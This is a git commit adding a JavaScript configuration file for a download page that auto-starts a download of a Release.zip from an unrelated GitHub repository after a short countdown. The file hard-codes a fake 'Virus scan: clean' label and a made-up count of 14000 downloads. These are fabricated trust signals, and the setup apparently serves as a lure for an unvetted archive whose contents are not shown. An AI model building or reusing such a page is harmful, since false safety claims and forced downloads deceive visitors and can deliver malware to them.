4c7877094cca1e873f9da20e339351913cec6f0f
mbaumann82 <m.baumann82@proton.me>
2026-09-22 18:24:36 -0400

    Add configuration for site download settings

---
+++ js/config.js
@@ -0,0 +1,14 @@
+window.SITE = {
+  owner: "mbaumann82",
+  repo: "iopago",
+  title: "Preparing Your Download",
+  subtitle:
+    "We’re getting everything ready for you.\nYour download will start automatically in a moment.",
+  downloads: 14000,
+  virusScan: "Virus scan: clean",
+  releaseUrl:
+    "https://github.com/saikin12/nlp_sinopsis/releases/download/afas/Release.zip",
+  assetName: "",
+  corsProxy: "",
+  countdown: 4,
+};
